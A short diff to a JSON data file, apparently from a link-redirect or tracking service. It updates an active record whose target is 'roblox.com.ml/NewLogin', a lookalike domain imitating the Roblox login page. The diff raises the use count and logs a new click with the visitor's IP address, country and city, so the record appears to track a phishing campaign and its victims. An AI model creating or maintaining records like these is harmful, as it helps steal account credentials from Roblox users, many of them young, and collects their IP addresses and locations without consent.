@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 2,
+    "useCount": 3,
     "createdBy": "admin",
     "clicks": [
       {
@@ -128,6 +128,14 @@
         "city": "Cabanatuan City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776856366391,
+        "ip": "128.127.127.208",
+        "country": "Romania",
+        "city": "Răcăciuni",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
       }
     ]
   },
